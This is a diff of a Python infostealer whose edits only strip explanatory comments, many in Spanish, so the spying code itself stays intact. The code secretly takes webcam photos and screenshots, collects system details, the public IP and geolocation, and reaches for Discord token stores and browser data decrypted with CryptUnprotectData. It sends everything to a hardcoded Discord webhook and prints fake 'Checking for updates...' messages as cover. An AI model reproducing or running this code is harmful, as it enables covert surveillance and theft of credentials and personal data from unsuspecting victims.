@@ -22,75 +22,75 @@ import time
 import shutil
 import getpass
 
-# Obtener la URL del webhook de Discord
+
 webhook_url = 'https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp'
 
-# Obtener el directorio AppData del usuario actual
+
 appdata_dir = os.path.join(os.getenv('APPDATA'), 'captured_photos')
 os.makedirs(appdata_dir, exist_ok=True)
 
-# Capturar una imagen con la cámara web
+
 cap = cv2.VideoCapture(0)
 ret, frame = cap.read()
 
-# Generar un nombre de archivo único basado en la fecha y hora actual
+
 current_time = time.strftime('%Y%m%d_%H%M%S')
 filename = f'captured_photo_{current_time}.jpg'
 
-# Guardar la foto capturada en la carpeta AppData
+
 filepath = os.path.join(appdata_dir, filename)
 cv2.imwrite(filepath, frame)
 
-# Cerrar la cámara web
+
 cap.release()
 
-# Crear una instancia de MultipartEncoder para enviar la imagen como archivo adjunto
+
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 multipart_data = MultipartEncoder(fields={'file': (filename, open(filepath, 'rb'), 'image/jpeg')})
 
-# Enviar la imagen al webhook de Discord
+
 headers = {'Content-Type': multipart_data.content_type}
 response = requests.post(webhook_url, data=multipart_data, headers=headers)
 
-# Verificar si la solicitud fue exitosa
+
 if response.status_code == 200:
     print('Imagen enviada con éxito a Discord.')
 else:
     print('Error al enviar la imagen a Discord. Código de estado:', response.status_code)
 
-# Esperar 2 segundos
+
 time.sleep(2)
 
 
-# Borrar la carpeta AppData si está vacía
+
 if len(os.listdir(appdata_dir)) == 0:
     os.rmdir(appdata_dir)
 
-# taking ss
 
-# Configura el webhook URL
+
+
 webhook_url = 'https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp'
 
-# Captura la pantalla y guarda la imagen en la carpeta temporal del sistema
+
 screenshot = pyautogui.screenshot()
 screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
 screenshot.save(screenshot_path)
 
-# Envía la imagen al webhook
+
 webhook = DiscordWebhook(url=webhook_url)
 with open(screenshot_path, 'rb') as f:
     webhook.add_file(file=f.read(), filename='screenshot.png')
 response = webhook.execute()
 
-# Borra la imagen después de enviarla
+
 async def delete_screenshot():
-    await asyncio.sleep(5)  # Espera 5 segundos
+    await asyncio.sleep(5)  
     os.remove(screenshot_path)
 
-# Ejecuta la función de eliminación en segundo plano
+
 asyncio.run(delete_screenshot())
 
-#rest of the logger
+
 
 class Chrome:
      def __init__(self):
@@ -284,19 +284,19 @@ if __name__ == "__main__":
 
 
 
- # Collect sensitive data
+
 sensitive_data = []
 
-# Gather system information
+
 system_info = platform.platform()
 
-# Gather user information
+
 user_info = platform.node()
 
- # Gather network details
+
 network_info = "Network information"
 
- # Prepare the collected data
+
 data = {
      "content": f"Sensitive Data: {sensitive_data}\n\n"
                 f"System Information: {system_info}\n\n"
@@ -304,10 +304,10 @@ data = {
                 f"Network Information: {network_info}"
  }
 
- # Discord webhook URL
+
 webhook_url = "https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp"
 
- # Send the data to the Discord webhook
+
 response = requests.post(webhook_url, json=data)
 
 if response.status_code != 204:
@@ -318,13 +318,13 @@ if response.status_code != 204:
 
 
 
- # Function to retrieve IP address
+
 def get_ip_address():
      response = requests.get('https://api.ipify.org?format=json')
      ip_data = response.json()
      return ip_data['ip']
 
-# Function to send IP address to Discord webhook
+
 def send_ip_to_discord(webhook_url, ip_address):
      data = {
         'content': f'```IP address is {ip_address}```'
@@ -334,14 +334,13 @@ def send_ip_to_discord(webhook_url, ip_address):
          print('Checking for updates...')
      else:
          print('Checking for updates...')
-# Set your Discord webhook URL
+
 webhook_url = 'https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp'
 
-# Get IP address and send it to Discord
+
 ip_address = get_ip_address()
 send_ip_to_discord(webhook_url, ip_address)
- #cookies
- # another sh
+
 webhook = "https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp" # WEBHOOK HERE
 
 from win32crypt import CryptUnprotectData
@@ -502,10 +501,10 @@ if __name__ == "__main__":
 
 
 
-# second logger
 
 
-# WARN: This one is for educational purposes only! I do not recommend using it on people
+
+
 
 import psutil
 import platform
@@ -534,13 +533,13 @@ from json import loads, dumps
 from shutil import copyfile
 from sys import argv
 
-# CONFIG -> Setup before compiling
-url= "https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp" #Paste Discord Webhook url
+
+url= "https://discord.com/api/webhooks/1129769872541368470/a7f2OtruLvlw2wK-BtlaWFLR_SZTxlPrubO4JGwp5uSYzWT1DYaOnucYJhWF9TVxCiAp" 
 
 
 
 
-# Scaling from bytes to KB,MB,GB, etc
+
 def scale(bytes, suffix="B"):
     defined = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
@@ -550,12 +549,12 @@ def scale(bytes, suffix="B"):
 
 uname = platform.uname()
 
-bt = datetime.fromtimestamp(psutil.boot_time()) # Boot time
+bt = datetime.fromtimestamp(psutil.boot_time()) 
 
 host = socket.gethostname()
 localip = socket.gethostbyname(host)
 
-publicip = get('https://api.ipify.org').text # Get public API
+publicip = get('https://api.ipify.org').text # 
 city = get(f'https://ipapi.co/{publicip}/city').text
 region = get(f'https://ipapi.co/{publicip}/region').text
 postal = get(f'https://ipapi.co/{publicip}/postal').text
@@ -569,11 +568,11 @@ mac = get_mac()
 
 
 roaming = os.getenv('AppData')
-## Output for txt file location
+
 output = open(roaming + "temp.txt", "a")
 
 
-## Discord Locations
+
 Directories = {
         'Discord': roaming + '\\Discord',
         'Discord Two': roaming + '\\discord',
@@ -776,7 +775,7 @@ if __name__ == "__main__":
     main.saved()
 
 
-# webhook functionality => collect rest of specified data, send it to our webhook
+
 
 
 def beamed():
